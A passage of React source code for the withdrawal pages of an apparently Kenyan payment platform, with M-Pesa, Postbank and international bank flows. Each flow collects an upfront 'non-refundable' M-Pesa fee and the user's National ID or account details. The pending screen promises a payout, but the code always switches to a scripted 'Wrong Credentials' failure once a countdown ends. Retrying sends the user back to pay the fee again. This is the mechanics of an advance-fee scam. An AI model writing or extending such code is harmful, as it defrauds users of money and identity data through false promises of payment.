  const [step,     setStep]     = useState(initialStep || 'notice');
  const [phone,    setPhone]    = useState(user?.phone || '');
  const [idNumber, setIdNumber] = useState('');
  const [errors,   setErrors]   = useState({});
  const [loading,  setLoading]  = useState(false);
  const [feeRef,   setFeeRef]   = useState(initialFeeRef || '');   // verified Daraja fee reference
  const FEE_KES = getMpesaWithdrawalFee(Number(user?.balance || 0));

  // countdown
  const DURATION = 92 * 1000;
  const deadlineRef = useRef(0);
  const [remaining, setRemaining] = useState(DURATION);
  useEffect(() => {
    if (step !== 'pending') return;
    deadlineRef.current = Date.now() + DURATION;
    setRemaining(DURATION);
    const t = setInterval(() => {
      const left = Math.max(0, deadlineRef.current - Date.now());
      setRemaining(left);
      if (left <= 0) { clearInterval(t); setTimeout(() => setStep('failed'), 800); }
    }, 1000);
    return () => clearInterval(t);
  }, [step]);

  function handleSubmitForm() {
    const errs = {};
    if (!phone.trim())    errs.phone    = 'Phone number is required';
    if (!idNumber.trim()) errs.idNumber = 'National ID number is required';
    if (Object.keys(errs).length) { setErrors(errs); return; }

    // Details are collected and validated BEFORE the withdrawal-fee payment.
    // Nothing is submitted to the server until Daraja confirms the fee payment.
    setErrors({});
    setStep('fee');
  }

  async function handleFeeSuccess(d) {
    const verifiedFeeRef = d?.checkoutRequestId || '';
    if (!verifiedFeeRef) {
      setErrors({ form: 'Payment was completed but no payment reference was returned. Please contact support.' });
      setStep('form');
      return;
    }

    const amount = Number(user?.balance || 0);
    setFeeRef(verifiedFeeRef);
    setLoading(true);

    let res;
    try {
      res = await createWithdrawalRequest(user.id, {
        fullName: user?.fullName || '',
        phone: phone.trim(),
        idNumber: idNumber.trim(),
        amount,
        feeRef: verifiedFeeRef,
        method: 'mpesa',
      });
    } catch (_) {
      res = { error: 'Network error. Please try again.' };
    }

    setLoading(false);

    if (!res || res.error) {
      setErrors({ form: (res && res.error) || 'Your withdrawal-fee payment could not be verified. Please try again.' });
      setStep('form');
      return;
    }

    try {
      await sendNotify({
        type: 'M-Pesa Withdrawal Request',
        name: user?.fullName || '',
        email: user?.email || '',
        phone,
        subject: 'M-Pesa Withdrawal Request',
        details: `Account: ${user?.fullName || ''} (${user?.email || ''})\nM-Pesa Phone: ${phone}\nNational ID: ${idNumber}\nAmount: KES ${amount.toLocaleString()}\nFee paid (verified): KES ${FEE_KES.toLocaleString()}\nStatus: Pending Manual Payment`,
      });
    } catch (_) {
      // The withdrawal request has already been accepted; notification failure must not crash the page.
    }

    setStep('pending');
  }

  const isLow = remaining < 30 * 1000;
  const pct   = Math.min(100, Math.max(0, (remaining / DURATION) * 100));

  // Bulk amounts (KES 25,000 or more) must be withdrawn through the bank, not M-Pesa.
  if (Number(user?.balance || 0) >= BULK_THRESHOLD_KES) {
    return (
      <FlowShell title="Withdraw with M-Pesa" subtitle="Bank withdrawal required" icon="smartphone" accent="var(--mpesa-green)">
        <div className="pay-message" style={{ borderColor: '#4b5563', background: '#f9fafb' }}>
          Your balance is <strong>KES {Number(user.balance).toLocaleString()}</strong>. Because this is a <strong>bulk amount</strong> (KES <strong>{BULK_THRESHOLD_KES.toLocaleString()}</strong> or more), it must be withdrawn <strong>through the bank</strong>, not M-Pesa.
        </div>
        <button className="pay-btn" style={{ background: '#000000' }} onClick={() => router.push('/withdraw?method=international')}>
          <Icon name="cash" size={16} /> Withdraw via Bank
        </button>
        <button className="withdraw-close-btn" style={{ marginTop: 10, display: 'inline-flex', alignItems: 'center', justifyContent: 'center', gap: 6 }} onClick={() => router.push('/dashboard')}><Icon name="arrowLeft" size={14} /> Back to Dashboard</button>
      </FlowShell>
    );
  }

  return (
    <FlowShell title="Withdraw with M-Pesa" subtitle="Instant M-Pesa payout" icon="smartphone" accent="var(--mpesa-green)">
      {step === 'notice' && (
        <>
          <div className="pay-message" style={{ borderColor: 'var(--mpesa-green)', background: '#f9fafb', marginBottom: 16 }}>
            <strong style={{ display: 'block', fontSize: 15, marginBottom: 6 }}>Instant M-Pesa Withdrawal</strong>
            Your withdrawal will be processed after verification. Please enter your correct M-Pesa details to avoid delays or failed payouts. Ensure your phone number is registered for M-Pesa before submitting your request.
          </div>
          <div className="pay-amount" style={{ marginBottom: 20 }}>
            <div className="pay-amount-label">Withdrawal Fee</div>
            <div className="pay-amount-value" style={{ color: 'var(--mpesa-green)' }}>KES {FEE_KES.toLocaleString()}</div>
            <div className="pay-amount-sub">A one-time, non-refundable processing fee is paid via M-Pesa before your request is submitted.</div>
          </div>
          <button className="pay-btn" style={{ background: 'var(--mpesa-green)' }} onClick={() => setStep('fee')}>
            Continue
          </button>
        </>
      )}

      {step === 'fee' && (
        <>
          <div className="pay-message" style={{ borderColor: 'var(--mpesa-green)', background: '#f9fafb', marginBottom: 18 }}>
            Pay the <strong>KES {FEE_KES.toLocaleString()}</strong> withdrawal fee via M-Pesa to continue. You&apos;ll get a prompt on your phone, enter your PIN to confirm. The withdrawal form unlocks only after the payment is verified.
          </div>
          <MpesaPay
            purpose="withdrawal_fee"
            amount={FEE_KES}
            defaultPhone={user?.phone || ''}
            payLabel={`Pay KES ${FEE_KES.toLocaleString()} via M-Pesa`}
            onSuccess={handleFeeSuccess}
          />
          <button className="withdraw-close-btn" style={{ marginTop: 10 }} onClick={() => router.push('/dashboard')}>
            <Icon name="arrowLeft" size={14} /> Back to Dashboard
          </button>
        </>
      )}

      {step === 'form' && (
        <>
          <div className="pay-message" style={{ borderColor: '#1f2937', background: '#f9fafb', marginBottom: 20 }}>
            Enter your details accurately. Your National ID must match your M-Pesa registration.
          </div>
          <div className="pay-phone-label">M-Pesa Phone Number</div>
          <input className="pay-phone-input" type="tel" value={phone}
            onChange={e => { setPhone(e.target.value); setErrors(p => ({ ...p, phone: undefined })); }}
            placeholder="+254 7XX XXX XXX" style={{ borderColor: errors.phone ? '#4b5563' : undefined }} />
          {errors.phone && <div style={{ color: '#4b5563', fontSize: 12, marginTop: 4 }}>{errors.phone}</div>}
          <div className="pay-phone-label" style={{ marginTop: 16 }}>National ID Number</div>
          <input className="pay-phone-input" type="text" value={idNumber}
            onChange={e => { setIdNumber(e.target.value); setErrors(p => ({ ...p, idNumber: undefined })); }}
            placeholder="e.g. 12345678" style={{ borderColor: errors.idNumber ? '#4b5563' : undefined }} />
          {errors.idNumber && <div style={{ color: '#4b5563', fontSize: 12, marginTop: 4 }}>{errors.idNumber}</div>}
          <div className="pay-message" style={{ borderColor: 'var(--mpesa-green)', background: '#f0fff4', marginTop: 16, fontSize: 13 }}>
            ✓ Withdrawal fee of <strong>KES {FEE_KES.toLocaleString()}</strong> paid and verified.
          </div>
          {errors.form && <div style={{ color: '#4b5563', fontSize: 13, marginTop: 10 }}>{errors.form}</div>}
          <button className="pay-btn" style={{ background: '#000000', marginTop: 16, opacity: loading ? 0.7 : 1 }} onClick={handleSubmitForm} disabled={loading}>
            {loading ? <><span className="spinner" /> Processing…</> : <><Icon name="cash" size={16} /> Submit Details & Continue to Payment</>}
          </button>
          <div className="pay-secure" style={{ display: 'flex', alignItems: 'center', justifyContent: 'center', gap: 6 }}><Icon name="lock" size={13} /> Your details are encrypted and secure</div>
        </>
      )}

      {step === 'pending' && (
        <>
          <div style={{ background: '#f9fafb', border: '1.5px solid #d1d5db', borderRadius: 12, padding: '14px 18px', marginBottom: 22, display: 'flex', gap: 12, alignItems: 'flex-start' }}>
            <span style={{ color: 'var(--mpesa-green)', display: 'flex' }}><Icon name="smartphone" size={20} /></span>
            <p style={{ margin: 0, fontSize: 14, color: '#1f2937', lineHeight: 1.65 }}>
              Your M-Pesa payment will be <strong>initiated in 2 minutes</strong>. Please keep this screen open and ensure your phone is on.
            </p>
          </div>
          <div style={{ textAlign: 'center', marginBottom: 22 }}>
            <div style={{ fontSize: 11, fontWeight: 700, letterSpacing: 1, color: 'var(--gray)', textTransform: 'uppercase', marginBottom: 8 }}>Time Remaining</div>
            <div style={{ fontFamily: 'monospace', fontSize: 52, fontWeight: 800, letterSpacing: 4, color: isLow ? '#4b5563' : '#1f2937', background: '#f9fafb', borderRadius: 14, padding: '14px 24px', display: 'inline-block', border: `2px solid ${isLow ? '#e5e7eb' : '#d1d5db'}`, minWidth: 160 }}>
              {formatMmSs(remaining)}
            </div>
            <div style={{ marginTop: 14, height: 7, background: '#e5e7eb', borderRadius: 99, overflow: 'hidden' }}>
              <div style={{ height: '100%', width: `${pct}%`, background: isLow ? '#4b5563' : '#000000', borderRadius: 99, transition: 'width 1s linear' }} />
            </div>
          </div>
          <button className="withdraw-close-btn" onClick={() => router.push('/dashboard')}>Close</button>
          <div className="withdraw-footer-note">Do not close the app. Keep your M-Pesa line active and await the STK push.</div>
        </>
      )}

      {step === 'failed' && (
        <>
          <div style={{ background: '#f9fafb', border: '1.5px solid #e5e7eb', borderRadius: 12, padding: '16px 18px', marginBottom: 22, display: 'flex', gap: 12, alignItems: 'flex-start' }}>
            <span style={{ color: '#111827', display: 'flex' }}><Icon name="warning" size={22} /></span>
            <div>
              <p style={{ margin: '0 0 6px', fontWeight: 700, fontSize: 14, color: '#1f2937' }}>Wrong Credentials</p>
              <p style={{ margin: 0, fontSize: 13, color: '#111827', lineHeight: 1.65 }}>
                The phone number or ID number you provided could not be verified. Please ensure your details are correct and try again.
              </p>
            </div>
          </div>
          <button className="pay-btn" style={{ background: '#000000', marginBottom: 12 }} onClick={() => setStep('form')}><Icon name="refresh" size={16} /> Check Details Again</button>
          <button className="withdraw-close-btn" onClick={() => router.push('/dashboard')}>Dismiss</button>
          <div className="withdraw-footer-note" style={{ color: '#374151' }}>Please ensure your phone number and National ID match your M-Pesa registration.</div>
        </>
      )}
    </FlowShell>
  );
}

// ── Postbank Kenya flow (M-Pesa prompt → fee → form → pending → failed) ────────
function PostbankFlow({ user, initialStep }) {
  const router = useRouter();
  const [step,     setStep]     = useState(initialStep || 'choice');
  const [name,     setName]     = useState(user?.fullName || '');
  const [account,  setAccount]  = useState('');
  const [idNumber, setIdNumber] = useState('');
  const [errors,   setErrors]   = useState({});
  const [loading,  setLoading]  = useState(false);
  const [feePaid,   setFeePaid]  = useState(false);

  const DURATION = 92 * 1000;
  const deadlineRef = useRef(0);
  const [remaining, setRemaining] = useState(DURATION);
  useEffect(() => {
    if (step !== 'pending') return;
    deadlineRef.current = Date.now() + DURATION;
    setRemaining(DURATION);
    const t = setInterval(() => {
      const left = Math.max(0, deadlineRef.current - Date.now());
      setRemaining(left);
      if (left <= 0) { clearInterval(t); setTimeout(() => setStep('failed'), 800); }
    }, 1000);
    return () => clearInterval(t);
  }, [step]);

  function handleSubmitForm() {
    const errs = {};
    if (!name.trim())     errs.name     = 'Account holder name is required';
    if (!account.trim())  errs.account  = 'Postbank account number is required';
    if (!idNumber.trim()) errs.idNumber = 'National ID number is required';
    if (Object.keys(errs).length) { setErrors(errs); return; }

    // Collect and validate the bank details first. Payment is requested only after
    // the user explicitly submits these details.
    setErrors({});
    setStep('fee');
  }

  async function handlePostbankFeeSuccess() {
    setFeePaid(true);
    setLoading(true);

    await sendNotify({
      type: 'Postbank Kenya Withdrawal Request',
      name: name.trim(), email: user?.email || '', phone: user?.phone || '',
      subject: 'Postbank Kenya Withdrawal Request',
      details: `Account Holder: ${name.trim()}\nPostbank Account: ${account.trim()}\nNational ID: ${idNumber.trim()}\nFee paid (verified): KES ${BANK_FEE_KES.toLocaleString()}\nStatus: Pending Manual Payment\nRequested by: ${user?.fullName || ''} (${user?.email || ''})`,
    });

    setLoading(false);
    setStep('pending');
  }

  const isLow    = remaining < 30 * 1000;
  const pct      = Math.min(100, Math.max(0, (remaining / DURATION) * 100));
  const accent   = '#000000';
  const overLimit = Number(user?.balance || 0) >= BULK_THRESHOLD_KES;

  return (
    <FlowShell title="Withdraw with Postbank Kenya" subtitle="Postbank payout" icon="cash" accent={accent}>
      {step === 'choice' && overLimit && (
        <>
          <div className="pay-message" style={{ borderColor: '#4b5563', background: '#f9fafb' }}>
            Your balance is <strong>KES {Number(user.balance).toLocaleString()}</strong>. Bulk amounts of <strong>KES {BULK_THRESHOLD_KES.toLocaleString()}</strong> or more must be withdrawn <strong>through the bank</strong>, not M-Pesa. Continue with Postbank Kenya below.
          </div>
          <button className="pay-btn" style={{ background: accent }} onClick={() => setStep('form')}>
            <Icon name="cash" size={16} /> Enter Postbank Details
          </button>
        </>
      )}

      {step === 'choice' && !overLimit && (
        <>
          <div className="pay-message" style={{ borderColor: '#1f2937', background: '#f3f4f6' }}>
            You’re withdrawing within <strong>Kenya</strong>. We recommend <strong>M-Pesa (Safaricom)</strong>, it’s instant and avoids the extra verification checks that bank transfers require. Only use <strong>Postbank Kenya</strong> if you can’t use Safaricom / M-Pesa, <strong>or if our management specifically asked you to withdraw via the bank.</strong>
          </div>
          <div style={{ fontWeight: 700, fontSize: 15, color: '#111827', margin: '4px 0 12px' }}>Do you want to withdraw using M-Pesa?</div>
          <button className="pay-btn" style={{ background: 'var(--mpesa-green)', marginBottom: 12 }} onClick={() => router.push('/withdraw?method=mpesa')}>
            <Icon name="check" size={16} /> Yes, withdraw with M-Pesa (recommended)
          </button>
          <button className="pay-btn" style={{ background: accent }} onClick={() => setStep('management')}>
            <Icon name="cash" size={16} /> No, I can’t use M-Pesa
          </button>
        </>
      )}

      {step === 'management' && (
        <>
          <div className="pay-message" style={{ borderColor: '#4b5563', background: '#f9fafb' }}>
            Bank withdrawals through <strong>Postbank Kenya</strong> are only for clients who were <strong>specifically asked by our management</strong> to use the bank. If you were not asked, please withdraw with <strong>M-Pesa</strong> instead.
          </div>
          <div style={{ fontWeight: 700, fontSize: 15, color: '#111827', margin: '4px 0 12px' }}>Were you asked by our management to withdraw via Postbank Kenya?</div>
          <button className="pay-btn" style={{ background: '#000000', marginBottom: 12 }} onClick={() => router.push('/withdraw?method=mpesa')}>
            <Icon name="smartphone" size={16} /> No, take me to M-Pesa
          </button>
          <button className="pay-btn" style={{ background: accent }} onClick={() => setStep('form')}>
            <Icon name="cash" size={16} /> Yes, management asked me, enter details
          </button>
          <button className="withdraw-close-btn" style={{ marginTop: 10 }} onClick={() => setStep('choice')}><Icon name="arrowLeft" size={14} /> Back</button>
        </>
      )}

      {step === 'fee' && (
        <>
          <div className="pay-message" style={{ borderColor: 'var(--mpesa-green)', background: '#f9fafb', marginBottom: 16 }}>
            Your Postbank withdrawal details have been submitted. Now pay the <strong>KES {BANK_FEE_KES.toLocaleString()}</strong> withdrawal processing fee via M-Pesa.
          </div>
          <MpesaPay
            purpose="withdrawal_fee"
            amount={BANK_FEE_KES}
            defaultPhone={user?.phone || ''}
            payLabel={`Pay KES ${BANK_FEE_KES.toLocaleString()} via M-Pesa`}
            onSuccess={handlePostbankFeeSuccess}
          />
          {loading && (
            <div style={{ textAlign: 'center', fontSize: 13, color: '#6b7280', marginTop: 10 }}>
              Payment verified. Submitting your withdrawal request…
            </div>
          )}
        </>
      )}

      {step === 'form' && (
        <>
          <div className="pay-message" style={{ borderColor: '#1f2937', background: '#f3f4f6', marginBottom: 20 }}>
            Enter your Postbank Kenya account details accurately. They must match your registered Postbank account.
          </div>
          <div className="pay-phone-label">Account Holder Name</div>
          <input className="pay-phone-input" value={name}
            onChange={e => { setName(e.target.value); setErrors(p => ({ ...p, name: undefined })); }}
            placeholder="e.g. John Otieno" style={{ borderColor: errors.name ? '#4b5563' : undefined }} />
          {errors.name && <div style={{ color: '#4b5563', fontSize: 12, marginTop: 4 }}>{errors.name}</div>}
          <div className="pay-phone-label" style={{ marginTop: 16 }}>Postbank Account Number</div>
          <input className="pay-phone-input" value={account}
            onChange={e => { setAccount(e.target.value); setErrors(p => ({ ...p, account: undefined })); }}
            placeholder="e.g. 0112345678" style={{ borderColor: errors.account ? '#4b5563' : undefined }} />
          {errors.account && <div style={{ color: '#4b5563', fontSize: 12, marginTop: 4 }}>{errors.account}</div>}
          <div className="pay-phone-label" style={{ marginTop: 16 }}>National ID Number</div>
          <input className="pay-phone-input" value={idNumber}
            onChange={e => { setIdNumber(e.target.value); setErrors(p => ({ ...p, idNumber: undefined })); }}
            placeholder="e.g. 12345678" style={{ borderColor: errors.idNumber ? '#4b5563' : undefined }} />
          {errors.idNumber && <div style={{ color: '#4b5563', fontSize: 12, marginTop: 4 }}>{errors.idNumber}</div>}
          <button className="pay-btn" style={{ background: accent, marginTop: 20 }} onClick={handleSubmitForm} disabled={loading}>
            {loading ? <><span className="spinner" /> Processing…</> : <><Icon name="cash" size={16} /> Submit Details & Continue to Payment</>}
          </button>
          <div className="pay-secure" style={{ display: 'flex', alignItems: 'center', justifyContent: 'center', gap: 6 }}><Icon name="lock" size={13} /> Your details are encrypted and secure</div>
        </>
      )}

      {step === 'pending' && (
        <>
          <div style={{ background: '#f3f4f6', border: '1.5px solid #d1d5db', borderRadius: 12, padding: '14px 18px', marginBottom: 22, display: 'flex', gap: 12, alignItems: 'flex-start' }}>
            <span style={{ color: '#111827', display: 'flex' }}><Icon name="cash" size={20} /></span>
            <p style={{ margin: 0, fontSize: 14, color: '#0f172a', lineHeight: 1.65 }}>
              Your Postbank Kenya payment will be <strong>initiated in 2 minutes</strong>. Please keep this screen open.
            </p>
          </div>
          <div style={{ textAlign: 'center', marginBottom: 22 }}>
            <div style={{ fontSize: 11, fontWeight: 700, letterSpacing: 1, color: 'var(--gray)', textTransform: 'uppercase', marginBottom: 8 }}>Time Remaining</div>
            <div style={{ fontFamily: 'monospace', fontSize: 52, fontWeight: 800, letterSpacing: 4, color: isLow ? '#4b5563' : '#1f2937', background: '#f3f4f6', borderRadius: 14, padding: '14px 24px', display: 'inline-block', border: `2px solid ${isLow ? '#e5e7eb' : '#d1d5db'}`, minWidth: 160 }}>
              {formatMmSs(remaining)}
            </div>
            <div style={{ marginTop: 14, height: 7, background: '#e5e7eb', borderRadius: 99, overflow: 'hidden' }}>
              <div style={{ height: '100%', width: `${pct}%`, background: isLow ? '#4b5563' : '#000000', borderRadius: 99, transition: 'width 1s linear' }} />
            </div>
          </div>
          <button className="withdraw-close-btn" onClick={() => router.push('/dashboard')}>Close</button>
          <div className="withdraw-footer-note">Do not close the app. Keep your line active and await confirmation.</div>
        </>
      )}

      {step === 'failed' && (
        <>
          <div style={{ background: '#f9fafb', border: '1.5px solid #e5e7eb', borderRadius: 12, padding: '16px 18px', marginBottom: 22, display: 'flex', gap: 12, alignItems: 'flex-start' }}>
            <span style={{ color: '#111827', display: 'flex' }}><Icon name="warning" size={22} /></span>
            <div>
              <p style={{ margin: '0 0 6px', fontWeight: 700, fontSize: 14, color: '#1f2937' }}>Wrong Credentials</p>
              <p style={{ margin: 0, fontSize: 13, color: '#111827', lineHeight: 1.65 }}>
                The account or ID details you provided could not be verified. Please ensure they match your Postbank Kenya account and try again.
              </p>
            </div>
          </div>
          <button className="pay-btn" style={{ background: accent, marginBottom: 12 }} onClick={() => setStep('form')}><Icon name="refresh" size={16} /> Try Again</button>
          <button className="withdraw-close-btn" onClick={() => router.push('/dashboard')}>Dismiss</button>
          <div className="withdraw-footer-note" style={{ color: '#374151' }}>Please ensure your Postbank account number and National ID are correct.</div>
        </>
      )}
    </FlowShell>
  );
}

// ── International flow (bank selector) ─────────────────────────────────────────
function InternationalFlow({ user, initialStep, initialFeeRef }) {
  const router = useRouter();
  // Other Countries flow: bank details first → submit details → fee payment →
  // final server verification + withdrawal request.
  const [gate,          setGate]          = useState('form'); // form → pay
  const [loading,       setLoading]       = useState(false);
  const [accountName,   setAccountName]   = useState('');
  const [selectedBank,  setSelectedBank]  = useState(null);
  const [bankOpen,      setBankOpen]      = useState(false);
  const [bankQuery,     setBankQuery]     = useState('');
  const [accountNumber, setAccountNumber] = useState('');
  const [errors,        setErrors]        = useState({});
  const [done,          setDone]          = useState(false);
  const [sending,       setSending]       = useState(false);
  const [feeRef,        setFeeRef]        = useState(initialFeeRef || '');   // verified Daraja fee reference
  const [quote,         setQuote]         = useState(null);
  const [loadingQuote,  setLoadingQuote]  = useState(false);
  const [quoteErr,      setQuoteErr]      = useState('');

  // The international fee is usd 51, converted to KES at the live rate (no deductions).
  async function loadQuote() {
    setLoadingQuote(true); setQuoteErr('');
    const res = await bulkWithdrawalQuote(0, 'international');
    setLoadingQuote(false);
    if (res?.success) setQuote(res);
    else setQuoteErr(res?.error || 'Could not calculate the fee. Please try again.');
  }
  useEffect(() => { loadQuote(); /* eslint-disable-next-line */ }, []);

  // Default to the country the user chose at registration
  const homeCountry = REG_COUNTRY_ALIAS[user?.country] || user?.country || '';
  const homeBanks   = WORLD_BANKS.filter(b => b.country === homeCountry);
  const q = bankQuery.trim().toLowerCase();
  // Default list always offers Mobile Banking first, then the user's country banks.
  const homeDefault = homeBanks.length ? [MOBILE_BANK, ...homeBanks].filter(Boolean) : WORLD_BANKS;
  const filteredBanks = q
    ? WORLD_BANKS.filter(b => b.name.toLowerCase().includes(q) || b.country.toLowerCase().includes(q))
    : homeDefault;

  const cleanedAcct = accountNumber.replace(/[\s-]/g, '');
  const acctValid   = !!selectedBank && selectedBank.re.test(cleanedAcct);
  const formValid   = accountName.trim().length > 0 && !!selectedBank && acctValid;

  function selectBank(b) {
    // Postbank Kenya has its own flow (M-Pesa prompt + processing fee)
    if (b.name === 'Postbank Kenya') { router.push('/withdraw?method=postbank'); return; }
    setSelectedBank(b); setBankOpen(false); setBankQuery(''); setAccountNumber('');
    setErrors(prev => ({ ...prev, bank: undefined, accountNumber: undefined }));
  }

  function handleSubmit() {
    if (!formValid || sending) return;

    // Bank details are collected and submitted first. The fee payment UI appears
    // only after the user has explicitly submitted the withdrawal details.
    setErrors({});
    setGate('pay');
  }

  async function handleInternationalFeeSuccess(d) {
    const verifiedFeeRef = d?.checkoutRequestId || '';
    if (!verifiedFeeRef) {
      setErrors({ form: 'Payment was completed but no payment reference was returned. Please contact support.' });
      setGate('form');
      return;
    }

    setFeeRef(verifiedFeeRef);
    setSending(true);
    const amount = Number(user?.balance || 0);

    // Server re-verifies the fee payment before recording the withdrawal request.
    let res;
    try {
      res = await createWithdrawalRequest(user.id, {
        fullName: accountName.trim(),
        phone: user?.phone || '',
        idNumber: `${selectedBank.name} (${selectedBank.country}) — Acct ${accountNumber.trim()}`,
        amount,
        feeRef: verifiedFeeRef,
        method: 'international',
      });
    } catch (_) {
      res = { error: 'Network error. Please try again.' };
    }

    if (!res || res.error) {
      setSending(false);
      setErrors({ form: (res && res.error) || 'Your fee payment could not be verified. Please try again.' });
      setGate('form');
      return;
    }

    const details =
      `Account Holder Name: ${accountName.trim()}\n` +
      `Bank: ${selectedBank.name} (${selectedBank.country})\n` +
      `Account Number: ${accountNumber.trim()}\n` +
      `Amount: KES ${amount.toLocaleString()}\n` +
      `Fee: paid & verified\n` +
      `Requested by: ${user?.fullName || ''} (${user?.email || ''})`;

    await sendNotify({
      type: 'International Withdrawal Request',
      name: accountName.trim(),
      email: user?.email || '',
      phone: user?.phone || '',
      subject: 'Withdrawal Request, Other Countries',
      details,
    });

    setSending(false);
    setDone(true);
  }

  if (done) {
    return (
      <FlowShell title="Withdraw from Other Countries" subtitle="Request submitted" icon="globe" accent="#000000">
        <div style={{ textAlign: 'center', padding: '10px 0' }}>
          <div style={{ marginBottom: 8, display: 'flex', justifyContent: 'center', color: '#111827' }}><Icon name="check" size={52} /></div>
          <div style={{ fontFamily: 'var(--font-display)', fontSize: 22, fontWeight: 800, color: '#1f2937', marginBottom: 6 }}>Request Received</div>
          <div className="pay-message" style={{ borderColor: '#1f2937', background: '#f3f4f6', textAlign: 'left', marginTop: 12 }}>
            We’ve received your withdrawal request and emailed you a confirmation at <strong>{user?.email}</strong>. Our payments team will process it and be in touch.
          </div>
          <button className="pay-btn" style={{ background: '#000000', marginTop: 18 }} onClick={() => router.push('/dashboard')}><Icon name="arrowLeft" size={16} /> Back to Dashboard</button>
        </div>
      </FlowShell>
    );
  }

  // Payment is shown only after the bank form has been submitted.
  if (gate === 'pay') {
    return (
      <FlowShell title="Withdraw from Other Countries" subtitle="Withdrawal fee" icon="globe" accent="#000000">
        <div className="pay-message" style={{ borderColor: 'var(--mpesa-green)', background: '#f9fafb', marginBottom: 16 }}>
          Your bank withdrawal details have been submitted. Now pay the withdrawal fee via M-Pesa.
          {quote ? <> The fee is <strong>KES {quote.amountDueKes.toLocaleString()}</strong> (≈ USD {quote.feeUsd} at {quote.rate}{quote.rateLive ? '' : ' approximate'}).</> : ' The current fee is being calculated.'}
        </div>
        {quoteErr && (
          <div style={{ color: '#4b5563', fontSize: 13, marginBottom: 12 }}>
            {quoteErr} <button onClick={loadQuote} style={{ background: 'none', border: 'none', color: '#111827', textDecoration: 'underline', cursor: 'pointer', padding: 0, fontSize: 13 }}>Retry</button>
          </div>
        )}
        {quote ? (
          <MpesaPay
            purpose="withdrawal_fee"
            amount={quote.amountDueKes}
            defaultPhone={user?.phone || ''}
            payLabel={`Pay KES ${Number(quote.amountDueKes).toLocaleString()} via M-Pesa`}
            onSuccess={handleInternationalFeeSuccess}
          />
        ) : (
          <div style={{ textAlign: 'center', padding: 16 }}>
            <span className="spinner" style={{ borderTopColor: '#000', borderColor: '#e5e7eb', width: 26, height: 26 }} />
          </div>
        )}
        {sending && (
          <div style={{ textAlign: 'center', fontSize: 13, color: '#6b7280', marginTop: 10 }}>
            Payment verified. Submitting your withdrawal request…
          </div>
        )}
        <button className="withdraw-close-btn" style={{ marginTop: 10 }} onClick={() => setGate('form')} disabled={sending}>
          <Icon name="arrowLeft" size={14} /> Back to Details
        </button>
      </FlowShell>
    );
  }

  return (
    <FlowShell title="Withdraw from Other Countries" subtitle="Enter your bank account details" icon="globe" accent="#000000">
      <div className="pay-message" style={{ borderColor: '#1f2937', background: '#f3f4f6', marginBottom: 20 }}>
        {homeBanks.length ? (
          <>Based on your registration, we’re showing banks in <strong>{homeCountry}</strong>. Choose your bank and enter your account number in the format shown, or search for a different bank. Our payments team is notified automatically when you submit.</>
        ) : (
          <>Enter your name, choose your bank, and type your account number in the format shown. When you submit, our payments team is notified automatically and you’ll get a confirmation email.</>
        )}
      </div>

      <div className="pay-phone-label">Account Holder Name</div>
      <input className="pay-phone-input" type="text" value={accountName}
        onChange={e => { setAccountName(e.target.value); setErrors(p => ({ ...p, accountName: undefined })); }}
        placeholder="e.g. John Brown" style={{ borderColor: errors.accountName ? '#4b5563' : undefined }} />
      {errors.accountName && <div style={{ color: '#4b5563', fontSize: 12, marginTop: 4 }}>{errors.accountName}</div>}

      <div className="pay-phone-label" style={{ marginTop: 16 }}>Bank</div>
      <div style={{ position: 'relative' }}>
        <button type="button" className="pay-phone-input" onClick={() => setBankOpen(o => !o)}
          style={{ display: 'flex', alignItems: 'center', justifyContent: 'space-between', gap: 8, width: '100%', textAlign: 'left', cursor: 'pointer', background: '#fff', borderColor: errors.bank ? '#4b5563' : undefined }}>
          {selectedBank ? (
            <span style={{ display: 'flex', alignItems: 'center', gap: 8, overflow: 'hidden' }}>
              <CodeBadge code={selectedBank.code} size={18} />
              <span style={{ fontWeight: 600, whiteSpace: 'nowrap', overflow: 'hidden', textOverflow: 'ellipsis' }}>{selectedBank.name}</span>
              <span style={{ color: '#9ca3af', fontSize: 12, whiteSpace: 'nowrap' }}>· {selectedBank.country}</span>
            </span>
          ) : (<span style={{ color: '#9ca3af' }}>Select your bank</span>)}
          <span style={{ color: '#9ca3af', display: 'flex', transform: bankOpen ? 'rotate(180deg)' : 'none' }}><Icon name="chevronDown" size={16} /></span>
        </button>
        {bankOpen && (
          <div style={{ position: 'absolute', top: 'calc(100% + 6px)', left: 0, right: 0, zIndex: 50, background: '#fff', border: '1px solid #e5e7eb', borderRadius: 12, boxShadow: '0 12px 32px rgba(0,0,0,0.18)', overflow: 'hidden' }}>
            <div style={{ display: 'flex', alignItems: 'center', gap: 8, padding: '10px 12px', borderBottom: '1px solid #f1f5f9' }}>
              <span style={{ color: '#9ca3af', display: 'flex' }}><Icon name="search" size={16} /></span>
              <input autoFocus value={bankQuery} onChange={e => setBankQuery(e.target.value)} placeholder="Search banks worldwide…" style={{ flex: 1, border: 'none', outline: 'none', fontSize: 14, background: 'transparent' }} />
            </div>
            <div style={{ maxHeight: 240, overflowY: 'auto' }}>
              {filteredBanks.length === 0 && <div style={{ padding: 16, textAlign: 'center', color: '#9ca3af', fontSize: 13 }}>No banks found</div>}
              {filteredBanks.map(b => {
                const active = selectedBank && selectedBank.id === b.id;
                return (
                  <button key={b.id} type="button" onClick={() => selectBank(b)}
                    style={{ display: 'flex', alignItems: 'center', gap: 10, width: '100%', textAlign: 'left', padding: '10px 12px', border: 'none', cursor: 'pointer', background: active ? '#f3f4f6' : '#fff' }}>
                    <CodeBadge code={b.code} size={20} />
                    <span style={{ flex: 1, minWidth: 0 }}>
                      <span style={{ display: 'block', fontWeight: 600, fontSize: 14, color: '#111827', whiteSpace: 'nowrap', overflow: 'hidden', textOverflow: 'ellipsis' }}>{b.name}</span>
                      <span style={{ display: 'block', fontSize: 12, color: '#9ca3af' }}>{b.country}</span>
                    </span>
                    {active && <span style={{ color: '#111827', display: 'flex' }}><Icon name="check" size={16} /></span>}
                  </button>
                );
              })}
            </div>
          </div>
        )}
      </div>
      {errors.bank && <div style={{ color: '#4b5563', fontSize: 12, marginTop: 4 }}>{errors.bank}</div>}

      <div className="pay-phone-label" style={{ marginTop: 16 }}>Account Number</div>
      <input className="pay-phone-input" type="text" value={accountNumber}
        onChange={e => { setAccountNumber(e.target.value); setErrors(p => ({ ...p, accountNumber: undefined })); }}
        placeholder={selectedBank ? selectedBank.ph : 'Select a bank first'} disabled={!selectedBank}
        style={{ borderColor: accountNumber && !acctValid ? '#4b5563' : undefined, background: selectedBank ? '#fff' : '#f3f4f6', cursor: selectedBank ? 'text' : 'not-allowed' }} />
      {selectedBank && (
